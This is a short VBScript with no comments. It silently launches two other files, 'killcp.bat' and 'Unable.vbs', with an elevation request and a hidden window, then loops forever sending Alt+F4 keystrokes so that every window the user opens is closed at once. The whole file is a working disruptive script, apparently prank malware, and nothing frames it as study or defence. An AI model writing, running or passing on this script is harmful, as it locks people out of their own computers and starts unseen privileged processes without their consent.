Option Explicit
Dim a,b,c

Set a=CreateObject("wscript.shell")
set b= CreateObject("Shell.Application")
b.ShellExecute "killcp.bat",,,"runas",0
b.ShellExecute "Unable.vbs",,,"runas",0

b=0
Do
a.sendkeys"%{F4}"
Loop 